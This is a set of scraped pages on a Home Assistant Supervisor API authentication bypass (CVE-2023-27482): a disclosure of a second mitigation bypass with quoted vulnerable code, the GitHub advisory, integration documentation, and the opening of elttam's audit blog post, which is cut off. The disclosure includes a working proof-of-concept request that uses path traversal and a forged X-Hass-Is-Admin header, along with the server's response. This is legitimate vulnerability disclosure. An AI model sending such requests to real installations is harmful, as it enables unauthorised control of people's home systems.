An alternative bypass which affects Home Assistant Core 2023.3.0 and 2023.3.1 running Home Assistant Supervisor 2023.03.2 was found which uses the [`/api/hassio_ingress` endpoint](https://github.com/home-assistant/core/blob/9733d31cd09d581c4ade91f0025f21ce7192ad9c/homeassistant/components/hassio/ingress.py#L33-L167).

As with the `/api/hassio` endpoint, requests sent to the `/api/hassio_ingress` endpoint will be proxied to the Supervisor API.

The behaviour with the ingress endpoint is slightly different to the `/api/hassio` endpoint as it [copies some headers](https://github.com/home-assistant/core/blob/9733d31cd09d581c4ade91f0025f21ce7192ad9c/homeassistant/components/hassio/ingress.py#L170-L192) from the user's request to the request sent to the Supervisor API:

```
def _init_header(request: web.Request, token: str) -> CIMultiDict | dict[str, str]:
    """Create initial header."""
    headers = {}

    # filter flags
    for name, value in request.headers.items():
        if name in (
            hdrs.CONTENT_LENGTH,
            hdrs.CONTENT_ENCODING,
            hdrs.TRANSFER_ENCODING,
            hdrs.SEC_WEBSOCKET_EXTENSIONS,
            hdrs.SEC_WEBSOCKET_PROTOCOL,
            hdrs.SEC_WEBSOCKET_VERSION,
            hdrs.SEC_WEBSOCKET_KEY,
        ):
            continue
        headers[name] = value

    # Inject token / cleanup later on Supervisor
    headers[X_AUTH_TOKEN] = os.environ.get("SUPERVISOR_TOKEN", "")

    # Ingress information
    headers[X_INGRESS_PATH] = f"/api/hassio_ingress/{token}"
```

Notably, the headers that are copied are based on a denylist, so arbitrary headers other than these few can be provided.

Within the Supervisor API, the [`core_proxy`](https://github.com/home-assistant/supervisor/blob/3646ae070efae07ef99723465b60e5ddc02283ec/supervisor/api/middleware/security.py#L273-L313) middleware function responsible for blocking unauthorised requests from the Core uses the request headers to do so:

```
    @middleware
    async def core_proxy(self, request: Request, handler: RequestHandler) -> Response:
        """Validate user from Core API proxy."""
        if (
            request[REQUEST_FROM] != self.sys_homeassistant
            or self.sys_homeassistant.version >= _CORE_VERSION
        ):
            return await handler(request)

        authorization_index: int | None = None
        content_type_index: int | None = None
        user_request: bool = False
        admin_request: bool = False
        ingress_request: bool = False

        for idx, (key, value) in enumerate(request.raw_headers):
            if key in (b"Authorization", b"X-Hassio-Key"):
                authorization_index = idx
            elif key == b"Content-Type":
                content_type_index = idx
            elif key == b"X-Hass-User-ID":
                user_request = True
            elif key == b"X-Hass-Is-Admin":
                admin_request = value == b"1"
            elif key == b"X-Ingress-Path":
                ingress_request = True

        if user_request or admin_request:
            return await handler(request)

        is_proxy_request = (
            authorization_index is not None
            and content_type_index is not None
            and content_type_index - authorization_index == 1
        )

        if (
            not CORE_FRONTEND.match(request.path) and is_proxy_request
        ) or ingress_request:
            raise HTTPBadRequest()
        return await handler(request)
```

If either `X-Hass-User-ID` or `X-Hass-Is-Admin` headers are provided, the request is allowed through, bypassing the final ingress check. Since the ingress endpoint allows passing these headers, by including either of these headers, combined with the payload from the first bypass, it is possible to access the Supervisor API on HA Core up to 2023.3.1 and on HA Supervisor up to 2023.03.2.

## Proof of Concept

```
$ http http://192.168.1.208:8123/api/hassio_ingress/.%09./supervisor/info X-Hass-Is-Admin:1
HTTP/1.1 200 OK
Date: Fri, 24 Mar 2023 03:57:50 GMT
Server: Python/3.10 aiohttp/3.8.4
Connection: close
Content-Type: application/json
Content-Length: 1050

{
  "result": "ok",
  "data": {
    "version": "2023.03.2",
    "version_latest": "2023.03.dev2103",
    "update_available": false,
    "channel": "dev",
    "arch": "amd64",
    "supported": false,
    "healthy": true,
    [...]
  }
}

```

The impact is exactly the same as in CVE-2023-27482.

# Discovered

* Original bug: February 2023, Joseph Surin, elttam
* Mitigation bypass 1: March 2023, Joseph Surin, elttam
* Mitigation bypass 2: March 2023, Victor Kahan, elttam

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c5ef1f08_20250115_115528.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhome-assistant%2Fcore%2Fsecurity%2Fadvisories%2FGHSA-2j8f-h4mr-qr25)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhome-assistant%2Fcore%2Fsecurity%2Fadvisories%2FGHSA-2j8f-h4mr-qr25)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=home-assistant%2Fcore)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[home-assistant](/home-assistant)
/
**[core](/home-assistant/core)**
Public

* [Notifications](/login?return_to=%2Fhome-assistant%2Fcore) You must be signed in to change notification settings
* [Fork
  32k](/login?return_to=%2Fhome-assistant%2Fcore)
* [Star
   75.8k](/login?return_to=%2Fhome-assistant%2Fcore)

* [Code](/home-assistant/core)
* [Issues
  2.9k](/home-assistant/core/issues)
* [Pull requests
  484](/home-assistant/core/pulls)
* [Actions](/home-assistant/core/actions)
* [Projects
  2](/home-assistant/core/projects)
* [Security](/home-assistant/core/security)
* [Insights](/home-assistant/core/pulse)

Additional navigation options

* [Code](/home-assistant/core)
* [Issues](/home-assistant/core/issues)
* [Pull requests](/home-assistant/core/pulls)
* [Actions](/home-assistant/core/actions)
* [Projects](/home-assistant/core/projects)
* [Security](/home-assistant/core/security)
* [Insights](/home-assistant/core/pulse)

# Authentication bypass Supervisor API

Critical

[frenck](/frenck)
published
GHSA-2j8f-h4mr-qr25
Mar 8, 2023

## Package

Home Assistant Core

## Affected versions

<2023.3.2

## Patched versions

2023.3.2

Home Assistant Supervisor

<2023.03.3

2023.03.3

## Description

### Impact

A remotely exploitable vulnerability bypassing authentication for accessing the Supervisor API through Home Assistant has been discovered.

This impacts all Home Assistant installation types that use the Supervisor 2023.03.2 or older.

* Home Assistant OS
* Home Assistant Supervised

Other installation types, like Home Assistant Container (for example Docker), or Home Assistant Core manually in a Python environment, are not affected.

### Patches

The issue has been mitigated and closed in Supervisor version 2023.03.3, which has been rolled out to all affected installations via the auto-update feature of the Supervisor. This rollout has been completed at the time of publication of this advisory.

Home Assistant Core 2023.3.2 included mitigation for this vulnerability. Upgrading to at least that version is thus advised.

### Workarounds

In case one is not able to upgrade the Home Assistant Supervisor or the Home Assistant Core application at this time, it is advised to not expose your Home Assistant instance to the internet.

### Credits

The security issue was found by [Joseph Surin](https://jsur.in) from [elttam](https://www.elttam.com/). Many thanks for bringing this to [our attention](https://www.home-assistant.io/security).

### References

* <https://www.home-assistant.io/blog/2023/03/08/supervisor-security-disclosure/>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27482>

### Edit history

* Adjusted Home Assistant Core version to 2023.3.2
* Adjusted Home Assistant Supervisor version to 2023.03.3

### Severity

Critical

10.0

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2023-27482

### Weaknesses

No CWEs

### Credits

* [![@josephsurin](https://avatars.githubusercontent.com/u/14977484?s=40&v=4)](/josephsurin)
  [josephsurin](/josephsurin)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.home-assistant.io_f71d3bda_20250115_115527.html ===


[2025.1.2](/blog/2025/01/03/release-20251/ "Latest version 2025.1.2 released January  9, 2025")

* [Getting started](/installation/)
* [Documentation](/docs/)
  + [Installation](/installation/)
  + [Automations](/docs/automation/)
  + [Dashboards](/dashboards/)
  + [Voice assistants](/voice_control/)
  + [Device organization](/docs/organizing/)
  + [Energy management](/docs/energy/)
  + [Advanced configuration](/docs/configuration/)
* [Integrations](/integrations/)
* [Blog](/blog/)
* [Need help?](/help/)

# On this page

* [Sensor entities](#sensor-entities)
* [Binary sensor entities](#binary-sensor-entities)
* [Update entities](#update-entities)
* [Actions](#actions)
  + [Action hassio.addon\_start](#action-hassioaddon_start)
  + [Action hassio.addon\_stop](#action-hassioaddon_stop)
  + [Action hassio.addon\_restart](#action-hassioaddon_restart)
  + [Action hassio.addon\_stdin](#action-hassioaddon_stdin)
  + [Action hassio.addon\_update](#action-hassioaddon_update)
  + [Action hassio.host\_reboot](#action-hassiohost_reboot)
  + [Action hassio.host\_shutdown](#action-hassiohost_shutdown)
  + [Action hassio.backup\_full](#action-hassiobackup_full)
  + [Action hassio.backup\_partial](#action-hassiobackup_partial)
  + [Action hassio.restore\_full](#action-hassiorestore_full)
  + [Action hassio.restore\_partial](#action-hassiorestore_partial)

[Home](/)
▸ [Integrations](/integrations/)
▸
# Home Assistant Supervisor

Supervisor integration allows you to monitor and control Supervisor add-ons and operating system from Home Assistant.
This integration is already installed if you run Home Assistant OS or Supervised. Please note that this integration
cannot be installed on Home Assistant Container or Core (Python venv) installation types.

## Sensor entities

For each installed add-on, the following sensors are available:

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| Version | no | Current version of the add-on |
| Newest Version | no | Latest version of the add-on currently available |
| CPU Percent | no | The CPU Percent usage of the add-on |
| Memory Percent | no | The Memory (RAM) Percent usage of the add-on |

For Home Assistant OS, the following sensors are available:

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| Version | no | Current version of the Home Assistant OS |
| Newest Version | no | Latest version of the Home Assistant OS currently available |

For Home Assistant Core, the following sensors are available:

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| CPU Percent | no | The CPU Percent usage of the core |
| Memory Percent | no | The Memory (RAM) Percent usage of the core |

For Home Assistant Supervisor, the following sensors are available:

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| CPU Percent | no | The CPU Percent usage of the supervisor |
| Memory Percent | no | The Memory (RAM) Percent usage of the supervisor |

For Home Assistant Host, the following sensors are available:

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| OS Agent Version | no | The version of the installed OS Agent |
| Apparmor Version | no | The version of apparmor |
| Disk Free | no | Free space (in GB) left on the device |
| Disk Total | no | Total space (in GB) on the device |
| Disk Used | no | Used space (in GB) on the device |

## Binary sensor entities

For each installed add-on Supervisor provides following binary sensors:

(These entities are disabled by default and must be reenabled to appear)

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| Update Available | no | Whether there is an update available for this add-on (This is deprecated, use the Update entities instead.) |
| Running | no | Whether the add-on is running or not. |

For Home Assistant OS Supervisor provides following binary sensors:

| Sensor | Enabled by default | Description |
| --- | --- | --- |
| Update Available | no | Whether there is an update available for OS |

## Update entities

For all your installed add-ons, Home Assistant Core, Home Assistant Supervisor, and for the Home Assistant Operating System (if you are running that), this integration will provide [update](/integrations/update) entities that provide information about pending updates, and will allow you to update to them.

## Actions

### Action hassio.addon\_start

Start an add-on.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `addon` | no | Add-on slug |

### Action hassio.addon\_stop

Stop an add-on.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `addon` | no | Add-on slug |

### Action hassio.addon\_restart

Restart an add-on.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `addon` | no | Add-on slug |

### Action hassio.addon\_stdin

Write data to add-on stdin.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `addon` | no | Add-on slug |

### Action hassio.addon\_update

Update add-on. This action should be used with caution since add-on updates can contain backward-incompatible changes. It is highly recommended that you review release notes/change logs before updating an add-on.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `addon` | no | Add-on slug |

### Action hassio.host\_reboot

Reboot the host system.

### Action hassio.host\_shutdown

Shutdown the host system.

### Action hassio.backup\_full

Create a full backup.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `name` | yes | By default, the current date and time are used in your local time, which you have set in your general settings. |
| `password` | yes | Optional password for backup |
| `compressed` | yes | `false` to create uncompressed backups |
| `location` | yes | Alternate backup location instead of using the default location for backups |
| `homeassistant_exclude_database` | yes | Exclude the Home Assistant database file from backup |

### Action hassio.backup\_partial

Create a partial backup.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `addons` | yes | List of add-on slugs to backup |
| `folders` | yes | List of directories to backup |
| `name` | yes | Name of the backup file. Default is the current date and time in the user’s local time |
| `password` | yes | Optional password for backup |
| `compressed` | yes | `false` to create uncompressed backups |
| `location` | yes | Alternate backup location instead of using the default location for backups |
| `homeassistant` | yes | Include Home Assistant and associated config in backup |
| `homeassistant_exclude_database` | yes | Exclude the Home Assistant database file from backup |

### Action hassio.restore\_full

Restore from full backup.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `slug` | no | Slug of backup to restore from |
| `password` | yes | Optional password for backup |

### Action hassio.restore\_partial

Restore from partial backup.

| Data attribute | Optional | Description |
| --- | --- | --- |
| `slug` | no | Slug of backup to restore from |
| `homeassistant` | yes | Whether to restore Home Assistant, `true` or `false` |
| `addons` | yes | List of add-on slugs to restore |
| `folders` | yes | List of directories to restore |
| `password` | yes | Optional password for backup |

#### **Help us improve our documentation**

Suggest an edit to this page, or provide/view feedback for this page.
 [Edit](https://github.com/home-assistant/home-assistant.io/tree/current/source/_integrations/hassio.markdown)
 [Provide feedback](https://github.com/home-assistant/home-assistant.io/issues/new?template=feedback.yml&url=https%3A%2F%2Fwww.home-assistant.io%2Fintegrations%2Fhassio%2F&version=2025.1.2&labels=current,integration%3A%20hassio)
 [View pending feedback](https://github.com/home-assistant/home-assistant.io/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc+label%3A%22integration%3A+hassio%22)

![](https://brands.home-assistant.io/_/hassio/logo.png)
The Home Assistant Supervisor integration was introduced in Home Assistant 0.42, and it's used by [79.4%](https://analytics.home-assistant.io/integrations "Open analytics.home-assistant.io") of the active installations.

 Its IoT class is [Local Polling.](/blog/2016/02/12/classifying-the-internet-of-things/#classifiers)

[🏠 Internal integration](/docs/quality_scale/#-internal)

 [View source on GitHub](https://github.com/home-assistant/core/tree/dev/homeassistant/components/hassio)

 [View known issues](https://github.com/home-assistant/core/issues?q=is%3Aissue+is%3Aopen+label%3A%22integration%3A+hassio%22)

# Integration owners

This integration is being maintained by the Home Assistant project.

# On this page

* [Sensor entities](#sensor-entities)
* [Binary sensor entities](#binary-sensor-entities)
* [Update entities](#update-entities)
* [Actions](#actions)
  + [Action hassio.addon\_start](#action-hassioaddon_start)
  + [Action hassio.addon\_stop](#action-hassioaddon_stop)
  + [Action hassio.addon\_restart](#action-hassioaddon_restart)
  + [Action hassio.addon\_stdin](#action-hassioaddon_stdin)
  + [Action hassio.addon\_update](#action-hassioaddon_update)
  + [Action hassio.host\_reboot](#action-hassiohost_reboot)
  + [Action hassio.host\_shutdown](#action-hassiohost_shutdown)
  + [Action hassio.backup\_full](#action-hassiobackup_full)
  + [Action hassio.backup\_partial](#action-hassiobackup_partial)
  + [Action hassio.restore\_full](#action-hassiorestore_full)
  + [Action hassio.restore\_partial](#action-hassiorestore_partial)

# Categories

* [Binary sensor](/integrations/#binary-sensor)
* [Sensor](/integrations/#sensor)
* [Update](/integrations/#update)

![Home Assistant](/images/footer-logo-text.svg)

Home Assistant is a project from the [Open Home Foundation](https://www.openhomefoundation.org/), sponsored by [Nabu Casa](https://www.nabucasa.com/).

### Join us and contribute!

* [GitHub repo](https://github.com/home-assistant/)
* [Developers Portal](https://developers.home-assistant.io)
* [Design Portal](https://design.home-assistant.io)
* [Data Science Portal](https://data.home-assistant.io)
* [Community Forum](https://community.home-assistant.io)
* [Reporting issues](/help/reporting_issues/)
* [Community Merch Store](https://home-assistant-store.creator-spring.com/)

### System status

* [Integration Alerts](https://alerts.home-assistant.io)
* [Security Alerts](/security/)
* [System Status](https://status.home-assistant.io)

### Companion apps

* [iOS and Apple devices](https://apps.apple.com/us/app/home-assistant/id1099568401)
* [Android and Wear OS](https://play.google.com/store/apps/details?id=io.homeassistant.companion.android)
* [...and more!](https://companion.home-assistant.io/)

### Governance

* [Privacy Notices](/privacy/)
* [Contributor License Agreement](/developers/cla/)
* [Terms of Service](/tos/)
* [Code of Conduct](/code_of_conduct/)
* [Credits](/developers/credits/)
* [License](/developers/license/)

### Follow us

[Sign up for our newsletter](https://building.open-home.io/#/portal)

Contact us [here](/cdn-cgi/l/email-protection#cda5a8a1a1a28da5a2a0a8e0acbebea4beb9aca3b9e3a4a2) for media and partnership inquiries. (No technical support!)

Website powered by [Jekyll](https://jekyllrb.com/)

Originally based on the [Oscailte theme](https://github.com/coogie/oscailte)

[![Deploys by Netlify Badge](/images/frontpage/netlify.svg)](https://www.netlify.com)



=== Content from www.elttam.com_170e57e9_20250114_200003.html ===

[![Logo](/assets/images/elttam_logo_full_orange_black 1.svg)](/index.html)

* [Home](/index.html)
* Services
  + [Security Testing](/security-testing)
  + [Adversary
    Simulation](/adversary-simulation-red-team)
  + [Applied Research](/applied-research)
* [Blog](/blog/)
* [Labs](/labs)
* [About Us](/about-us)
* [Contact Us](/contact)

# PwnAssistant - Controlling /home's via a Home Assistant RCE

Auditing the Home Assistant Pre-Auth Attack Surface

elttam
•May 09, 2023

# Introduction

Recently, a few members in our team decided to look into home automation and the inherent risks that come with having a “smart home”. Although IoT devices and their associated cloud infrastructure may pose a risk on it’s own, we decided to look into the very established and known open-source automation ecosystem known as [Home Assistant](https://www.home-assistant.io).

As the idea of a smart home increases in popularity, so do the inherent risks, and often users are left asking themselves: How secure is this device? Where is my data going? Who else can see my data? Thankfully, software such as Home Assistant exists, with the goal of taking those smart devices offline, or at least away from the vendor managed cloud instances or required additional hardware bridges.

Home Assistant used to be targeted towards the more tech savvy, and those who wanted to tinker and really configure every detail of the devices they wanted to control within the household. However, as popularity increased, the suite of products has become much more user friendly and has built readily available images for all kinds of architectures, devices (Raspberry Pi) and OS’.

Although Home Assistant aims to bring devices offline and return power to the user, many users still aim to access their instances remotely, whether that be through a private VPN tunnel, or perhaps exposure to the internet. Some online research even suggests that there are over [130,000](https://www.shodan.io/search?query=product%3A%22Home+Assistant%22) publicly accessible instances (that we know of).

The potential impacts of a home network compromise can be disastrous. [News](https://www.theverge.com/2023/2/28/23618353/lastpass-security-breach-disclosure-password-vault-encryption-update) surrounding the recent LastPass data breach revealed that attackers were able to compromise a developer account through a targeted attack against a service running on an employee’s personal home network. Given Home Assistant’s role in managing devices on a home network, it’s not unreasonable to imagine how a critical vulnerability in it may lead to a complete takeover of a home and give an attacker the ability to control cameras or listen in on private conversations. Furthermore, Home Assistant’s vast interconnectivity with third-party services means many users store sensitive credentials in plaintext on their Home Assistant machines – a compromise of these could lead to even more severe consequences. As such, security should be at the forefront of mind when developing or using any sort of system of this nature.

So without further ado, come with us on this journey to understanding the Home Assistant architecture, enumerating the attack surface and trawling for pre-authentication vulnerabilities within the code base.

# Architecture

The aim of this section is to give an architectural overview of Home Assistant to provide context about the different components which we’ll discuss in this post. The developers documentation already gives a great [overview](https://developers.home-assistant.io/docs/architecture_index/) so we encourage giving that a read for some extra background.

Home Assistant can be [installed](https://www.home-assistant.io/installation/) in four different ways. These different installation types give users the ability to run Home Assistant according to their requirements and customise how much or how little is automatically managed.

* The recommended installation method is via the *Home Assistant Operating System (HAOS)*, which is a fully fledged Linux based operating system that runs the various Home Assistant components in Docker containers. This is intended to be run on devices like a Raspberry Pi, or within a virtual machine.
* The standalone *Home Assistant Container* installation method is also recommended and provides a convenient way to run Home Assistant on a machine with Docker. This installation method does not come with the Supervisor component, so it misses out on a few features, namely add-ons.
* The *Home Assistant Supervised* installation involves manually installing the Supervisor component on a Linux system which gives the full Home Assistant experience while letting the user manage the operating system themself.
* Finally, the *Home Assistant Core* installation method is another manual installation in which the user runs the Home Assistant Core application directly with Python. As with the Home Assistant Container method, this does not come with the Supervisor component.

The three main components of a Home Assistant installation are the Home Assistant Core application, the Supervisor and the Operating System. All installations run at least the Core, while only the Supervised and Operating System installations run the Supervisor component. Since the Operating System component is only included in HAOS installations and because of its harder-to-reach attack surface, it was not an area of significant focus during our research. The other two components however, proved to be quite interesting to look at.

## Home Assistant Core

Home Assistant Core is, as its name suggests, the core of a Home Assistant installation. It is a Python application whose source code can be found in the [home-assistant/core](https://github.com/home-assistant/core) repository where it is very actively developed. The Core is what an end user, IoT device or service interacts with. It even talks to the Supervisor to make it easy for a user to manage things like backups and add-ons from within the web user interface. The core of the Core however is actually quite minimal. Some of the most interesting functionality Home Assistant has to offer is provided through *integrations*.

Integrations are Python modules that enrich the Home Assistant experience by leveraging helper classes made available by the Core to perform all sorts of useful things. These kinds of things can range from simple tasks like [downloading files](https://www.home-assistant.io/integrations/downloader) and [processing video and audio with FFmpeg](https://www.home-assistant.io/integrations/ffmpeg/) to providing an interface for other integrations to expose [HTTP](https://www.home-assistant.io/integrations/http/) endpoints and register [WebSocket](https://www.home-assistant.io/integrations/websocket_api/) commands. Even the [frontend](https://www.home-assistant.io/integrations/frontend/) web user interface is implemented as an integration. There’s also an integration that literally performs [integration](https://www.home-assistant.io/integrations/integration/).

Anyone can [develop](https://developers.home-assistant.io/docs/creating_component_index) and install custom integrations. The Core itself also comes with a bunch of built-in integrations, which can be found in the [`core/homeassistant/components/`](https://github.com/home-assistant/core/tree/dev/homeassistant/components) directory.

## The Supervisor Component

The Supervisor component is a Python program that lives in the [home-assistant/supervisor](https://github.com/home-assistant/supervisor/) repository. Its responsibility is to manage various parts of the Home Assistant installation by doing things like actually running/updating Home Assistant Core, managing backups, managing add-ons and even updating the operating system (when running a HAOS installation).

It exposes a [HTTP API](https://developers.home-assistant.io/docs/api/supervisor/endpoints/) which is how the Core communicates with it. In the default HAOS installation, this service is not exposed on the network, so it is not possible to access this API remotely or even from within the same LAN.

The Home Assistant developers documentation provides some great diagrams to summarise the overall architecture and an example of how different components interact with the Core:

[![](/assets/images/blog/2023-05-10-pwnassistant/architecture-full.svg)](https://developers.home-assistant.io/docs/architecture_index/)
[![](/assets/images/blog/2023-05-10-pwnassistant/architecture-component-interaction.svg)](https://developers.home-assistant.io/docs/architecture_components)
# Attack Surface Enumeration

Home Assistant is a big application with a lot of moving parts. Although we had spent some time understanding the architecture and how things fit together, we needed to narrow the focus down a bit to a reasonable subset of components and code to manually audit.

Before properly diving deep into testing and auditing, we noted a few things that we considered interesting from a security perspective:

* There is (somewhat) a concept of privilege separation between user accounts
* Devices can be automatically discovered and configured by Home Assistant
* A web application runs on port 8123 and makes extensive use of HTTP APIs and WebSockets

## Privilege Separation

Differing user permissions within an application is always an interesting thing to look into as vulnerabilities which allow a user to elevate their privileges or otherwise do something they shouldn’t be permitted to do can often have severe consequences. Home Assistant has a concept of user levels – the first account created when you set up a Home Assistant instance is the *owner*, and the owner can create other *administrator* and *user* accounts. However, as of Home Assistant 2023.4.6 (the latest version at the time of writing), there is no functional difference between administrator and user accounts. User accounts are unable to view the settings page within the web application user interface, but otherwise has practically the same access as administrator users in API endpoints and as such can trivially escalate privileges to that of an administrator.

This is well documented in both the [user documentation](https://www.home-assistant.io/docs/authentication/#user-accounts) and [developer documentation](https://developers.home-assistant.io/docs/auth_permissions/). Additionally, when creating a new user through the web application user interface, a message is included which makes note of this:

![](/assets/images/blog/2023-05-10-pwnassistant/add-user-warning.png)

A [developer blog post](https://developers.home-assistant.io/blog/2019/03/11/user-permissions/) from 2019 highlights the work-in-progress status of the user permission system and how they plan to properly enforce the distinction between users and administrators. What this means for us is that the authenticated attack surface is still an interesting target, even if not immediately useful.

## Local Attack Surface

Part of what makes Home Assistance so convenient is it’s ability to automatically discover and configure devices in your home. This convenience naturally comes with some risks as it exposes services over the LAN – services which could be targeted for lateral movement given an attacker is able gain a foothold in the local network, for example, by compromising a device via the internet. By default, Home Assistant provides a few core integrations which allow other integrations to implement auto-discovery. We found the following to be the most widely used:

* [Zero-configuration networking (zeroconf)](https://www.home-assistant.io/integrations/zeroconf/)
* [Simple Service Discovery Protocol (SSDP)](https://www.home-assistant.io/integrations/ssdp/)
* [DHCP Discovery](https://www.home-assistant.io/integrations/dhcp/)

While these integrations present some interesting attack surface, we noted that a much larger attack surface is likely to be available through the actual device integrations which consume these core integrations to implement auto-discovery. In most cases, it’s relatively easy to enumerate which integrations are using these auto-discovery protocols by grepping for import statements. As an example, to find integrations that support auto-discovery using zeroconf, we can grep for `import zeroconf`:

```
$ grep -r 'import zeroconf' 'homeassistant/components/'
homeassistant/components/devolo_home_control/config_flow.py:from homeassistant.components import zeroconf
...
homeassistant/components/lutron_caseta/config_flow.py:from homeassistant.components import zeroconf

```

This can help to narrow down the scope to popular devices where an integration may have a vulnerability in the way a potentially attacker-provided payload is used.

We also noted the [Bluetooth](https://www.home-assistant.io/integrations/bluetooth/) and [USB](https://www.home-assistant.io/integrations/usb/) integrations to have some interesting attack surface for an attacker with physical proximity to a Home Assistant installation.

We didn’t end up spending too much time hunting for bugs in the local attack surface exposed via auto-discovery, partly due to the attack surface provided by the web application being just as interesting while also having a higher likelihood of practical exploitability. Furthermore, the web application is still a viable attack surface via the local network anyway – a vulnerability in the web application may allow an attacker with a foothold in the local network to take control over the Home Assistant instance even if it isn’t exposed to the internet. Given our limited time, we hit two birds with one stone by focusing on this for both local and remote attacks, however, we still considered auto-discovery to be an important part of Home Assistant and think it would be a good target for further research.

## Remote Attack Surface

From the perspective of a (unauthenticated) remote attacker, the web application running on port 8123 may be the most accessible target when looking to pwn an internet-exposed Home Assistant instance. As we hinted at in the [architecture](#home-assistant-core) section, it is possible for integrations to add HTTP endpoints and register WebSocket commands. Since both HTTP endpoints and WebSockets can be reached via the web application, each integration that does this slightly increases the attack surface area.

### WebSockets

